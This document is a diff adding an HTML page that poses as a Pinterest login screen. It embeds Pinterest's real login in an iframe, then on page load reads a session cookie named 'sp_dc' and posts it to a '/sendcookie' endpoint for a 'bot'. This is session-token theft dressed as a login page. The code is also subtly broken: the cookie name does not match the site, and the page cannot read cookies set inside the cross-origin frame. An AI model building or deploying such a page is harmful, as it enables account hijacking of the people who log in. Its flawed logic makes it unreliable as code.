@@ -1,0 +1,44 @@
+<!-- login.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login to Pinterest</title>
+  <script>
+    async function extractCookie() {
+      const cookies = document.cookie.split("; ");
+      const sp_dc = cookies.find(c => c.startsWith("sp_dc="));
+      if (sp_dc) {
+        const value = sp_dc.split("=")[1];
+        const chatId = "{{chat_id}}";  // Injected by backend (optional)
+        const res = await fetch("/sendcookie", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            sp_dc: value,
+            chat_id: chatId
+          })
+        });
+
+        if (res.ok) {
+          document.getElementById("status").innerText = "✅ Cookie sent to bot successfully!";
+        } else {
+          document.getElementById("status").innerText = "❌ Failed to send cookie.";
+        }
+      } else {
+        document.getElementById("status").innerText = "❌ sp_dc cookie not found!";
+      }
+    }
+
+    window.onload = () => {
+      setTimeout(extractCookie, 5000); // Give time for Pinterest to set cookies
+    };
+  </script>
+</head>
+<body>
+  <h2>Login to Pinterest</h2>
+  <iframe src="https://www.pinterest.com/login" width="100%" height="600px"></iframe>
+  <p id="status">⏳ Waiting for Pinterest login...</p>
+</body>
+</html>
